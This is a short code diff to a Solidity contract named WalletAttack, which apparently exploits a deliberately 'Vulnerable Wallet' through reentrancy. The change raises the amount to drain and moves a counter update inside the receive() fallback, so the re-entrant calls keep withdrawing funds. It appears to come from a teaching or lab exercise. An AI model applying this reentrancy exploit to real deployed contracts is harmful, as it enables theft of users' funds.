@@ -10,7 +10,7 @@ interface WalletI {
 contract WalletAttack {
     // A contract used to attack the Vulnerable Wallet.
     WalletI private _target;
-    uint private constant TARGET_AMOUNT = 3 ether;
+    uint private constant TARGET_AMOUNT = 4 ether;
     uint private receivedAmount = 0;
 
     constructor() {
@@ -45,8 +45,8 @@ contract WalletAttack {
     }
 
     receive () external payable {
+        receivedAmount += msg.value;
         if (address(_target).balance >= 1 ether && receivedAmount < TARGET_AMOUNT) {
-            receivedAmount += msg.value;
             this.exploit_env();
         }
     }
